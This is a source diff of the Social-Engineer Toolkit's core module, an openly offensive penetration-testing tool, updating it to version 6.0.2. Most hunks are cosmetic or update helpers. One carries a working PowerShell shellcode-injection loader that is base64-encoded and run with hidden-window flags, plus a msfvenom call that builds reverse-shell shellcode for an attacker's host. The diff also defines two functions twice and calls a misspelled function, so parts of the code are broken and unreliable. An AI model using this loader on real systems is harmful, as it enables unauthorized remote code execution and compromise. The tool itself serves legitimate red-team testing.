@@ -24,7 +24,8 @@ try:
     from Crypto.Cipher import AES
 
 except ImportError:
-    print "[!] The python-pycrypto python module not installed. You will loose the ability for encrypted communications."
+
+    print "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications."
     pass
 
 # get the main SET path
@@ -229,7 +230,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '5.4.8'
+    define_version = '6.0.2'
     return define_version
 
 class create_menu:
@@ -277,11 +278,13 @@ def meta_path():
     else: msf_path = msf_path + "/"
     trigger = 0
     if not os.path.isdir(msf_path):
+
                 # specific for kali linux
                 if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
                     msf_path = "/opt/metasploit/apps/pro/msf3/"
                     trigger = 1
-                # specific for backtrack5
+
+                # specific for backtrack5 and other backtrack versions
                 if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                     msf_path = "/opt/framework3/msf3/"
                     trigger = 1
@@ -294,6 +297,7 @@ def meta_path():
                 if os.path.isfile("/usr/bin/msfconsole"):
                     msf_path = ""
                     trigger = 1
+
                 # specific for pwnpad and pwnplug (pwnie express)
                 if os.path.isfile("/opt/metasploit-framework/msfconsole"):
                     msf_path = "/opt/metasploit-framework"
@@ -307,6 +311,8 @@ def meta_path():
                             print_error("Please configure in the config/set_config.")
                             return_continue()
                             return False
+
+                    # if we are using windows
                     if check_os() == "windows":
                         print_warning("Metasploit payloads are not currently supported. This is coming soon.")
                         msf_path = ""
@@ -399,27 +405,70 @@ def cleanup_routine():
     except:
         pass
 
-#
-# Update Metasploit
-#
-def update_metasploit():
-    print_info("Updating the Metasploit Framework...Be patient.")
-    msf_path = meta_path()
-    svn_update = subprocess.Popen("cd %s/;svn update" % (msf_path), shell=True).wait()
-    print_status("Metasploit has successfully updated!")
-    return_continue()
+# quick check to see if we are running kali-linux
+def check_kali():
+    if os.path.isfile("/etc/apt/sources.list"):
+        kali = file("/etc/apt/sources.list", "r")
+        kalidata = kali.read()
+        if "kali" in kalidata:
+            return "Kali"
+        # if we aren't running kali
+        else: return "Non-Kali"
+    else:
+        print "[!] Not running a Debian variant.."
+        return "Non-Kali"
+
+# checking if we have bleeding-edge enabled for updates
+def bleeding_edge():
+    # first check if we are actually using Kali
+    kali = check_kali()
+    if kali == "Kali":
+        print_status("Checking to see if bleeding-edge repos are active.")
+        # check if we have the repos enabled first
+        fileopen = file("/etc/apt/sources.list", "r")
+        kalidata = fileopen.read()
+        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
+            print_status("Bleeding edge already active..Moving on..")
+            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
+            return True
+
+        # else lets add them if they want
+        else:
+            print_status("Adding Kali bleeding edge to sources.list for updates.")
+            # we need to add repo to kali file
+            # we will rewrite the entire apt in case not all repos are there
+            filewrite = file("/etc/apt/sources.list", "w")
+            filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
+            filewrite.close()
+            print_status("Updating Kali now...")
+            subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
+            return True
+
+    else:
+        print "[!] Kali was not detected. Not adding bleeding edge repos."
+        return False
 
 #
 # Update The Social-Engineer Toolkit
 #
 def update_set():
-    print_info("Updating the Social-Engineer Toolkit, be patient...")
-    print_info("Performing cleanup first...")
-    subprocess.Popen("git clean -fd", shell=True).wait()
-    print_info("[*] Updating... This could take a little bit...")
-    subprocess.Popen("git pull", shell=True).wait()
-    print_status("The updating has finished, returning to main menu..")
-    time.sleep(2)
+    kali = check_kali()
+    if kali == "Kali":
+        print_status("You are running Kali Linux which maintains SET updates.")
+        print_status("You can enable bleeding-edge repos for up-to-date SET.")
+        time.sleep(2)
+        bleeding_edge()
+
+    # if we aren't running Kali :( 
+    else:
+        peinr_info("Kali-Linux not detected, manually updating..")
+        print_info("Updating the Social-Engineer Toolkit, be patient...")
+        print_info("Performing cleanup first...")
+        subprocess.Popen("git clean -fd", shell=True).wait()
+        print_info("Updating... This could take a little bit...")
+        subprocess.Popen("git pull", shell=True).wait()
+        print_status("The updating has finished, returning to main menu..")
+        time.sleep(2)
 
 #
 # Pull the help menu here
@@ -753,7 +802,7 @@ def show_banner(define_version,graphic):
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
 [---]                Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
-[---]              Codename: '""" + bcolors.YELLOW + """Walkers""" + bcolors.BLUE + """'                 [---]
+[---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
@@ -765,7 +814,7 @@ def show_banner(define_version,graphic):
     print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
-    menu = random.randrange(2,11)
+    menu = random.randrange(2,12)
     if menu == 2:
         print bcolors.YELLOW + r"""
                  .--.  .--. .-----.
@@ -898,6 +947,31 @@ def show_graphic():
                      
                 https://www.trustedsec.com""" + bcolors.ENDC
 
+    if menu == 11:
+        print bcolors.backBlue + r"""
+                          _                                           J
+                         /-\                                          J
+                    _____|#|_____                                     J
+                   |_____________|                                    J
+                  |_______________|                                   E
+                 ||_POLICE_##_BOX_||                                  R
+                 | |-|-|-|||-|-|-| |                                  O
+                 | |-|-|-|||-|-|-| |                                  N
+                 | |_|_|_|||_|_|_| |                                  I
+                 | ||~~~| | |---|| |                                  M
+                 | ||~~~|!|!| O || |                                  O
+                 | ||~~~| |.|___|| |                                  O
+                 | ||---| | |---|| |                                  O
+                 | ||   | | |   || |                                  O
+                 | ||___| | |___|| |                                  !
+                 | ||---| | |---|| |                                  !
+                 | ||   | | |   || |                                  !
+                 | ||___| | |___|| |                                  !
+                 |-----------------|                                  !
+                 |   Timey Wimey   |                                  !
+                 -------------------                                  !""" + bcolors.ENDC
+
+
 #
 # identify if set interactive shells are disabled
 #
@@ -921,7 +995,7 @@ def menu_back():
 def custom_template():
     try:
         print ("         [****]  Custom Template Generator [****]\n")
-        print ("Always looking for new templates! In the set/src/templates directory send an email\n   to davek@secmaniac.com if you got a good template!")
+        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author=raw_input(setprompt("0", "Enter the name of the author"))
         filename=randomgen=random.randrange(1,99999999999999999999)
         filename=str(filename)+(".template")
@@ -1180,8 +1254,10 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # heres our shellcode prepped and ready to go
     shellcode = newdata[:-1]
+
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))	
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))
+
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
@@ -1190,10 +1266,10 @@ def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
+    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
     data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     # return data
     return data
@@ -1517,3 +1593,79 @@ def capture(func, *args, **kwargs):
     sys.stdout = stdout
     sys.stderr = stderr
     return (result, c1.getvalue(), c2.getvalue())
+
+
+def check_kali():
+    if os.path.isfile("/etc/apt/sources.list"):
+        kali = file("/etc/apt/sources.list", "r")
+        kalidata = kali.read()
+        if "kali" in kalidata:
+            return "Kali"
+        # if we aren't running kali
+        else: return "Non-Kali"
+    else:
+        print "[!] Not running a Debian variant.."
+        return "Non-Kali"
+
+# checking if we have bleeding-edge enabled for updates
+def bleeding_edge():
+    # first check if we are actually using Kali
+    kali = check_kali()
+    if kali == "Kali":
+        print_status("Checking to see if bleeding-edge repos are active.")
+        # check if we have the repos enabled first
+        fileopen = file("/etc/apt/sources.list", "r")
+        kalidata = fileopen.read()
+        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
+            print_status("Bleeding edge already active..Moving on..")
+            return True
+        else:
+            print_warning("Bleeding edge repos were not detected. This is recommended.")
+            enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
+            if enable == "y" or enable == "yes":
+                print_status("Adding Kali bleeding edge to sources.list for updates.")
+                # we need to add repo to kali file
+                # we will rewrite the entire apt in case not all repos are there
+                filewrite = file("/etc/apt/sources.list", "w")
+                filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
+                filewrite.close()
+                print "[*] It is recommended to now run apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove and restart SET."
+                return True
+            else:
+                print "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!"
+
+# here we give multiple options to specify for SET java applet
+def applet_choice():
+    
+    # prompt here 
+    print """
+[-------------------------------------------]
+Java Applet Configuration Options Below
+[-------------------------------------------]
+
+Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.
+
+Select which option you want:
+
+1. Make my own self-signed certificate applet.
+2. Use the applet built into SET.
+3. I have my own code signing certificate or applet.\n"""
+
+    choice1 = raw_input("Enter the number you want to use [1-3]: ")
+
+    # use the default
+    if choice1 == "": choice1 = "2"
+
+    # make our own
+    if choice1 == "1":
+        try: import src.html.unsigned.self_sign
+        except: reload(src.html.unsigned.self_sign)
+
+    # if we need to use the built in applet
+    if choice1 == "2":
+        print_status("Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")
+
+    # if we want to build our own
+    if choice1 == "3":
+        try: import src.html.unsigned.verified_sign
+        except: reload(src.html.unsigned.verified_sign)
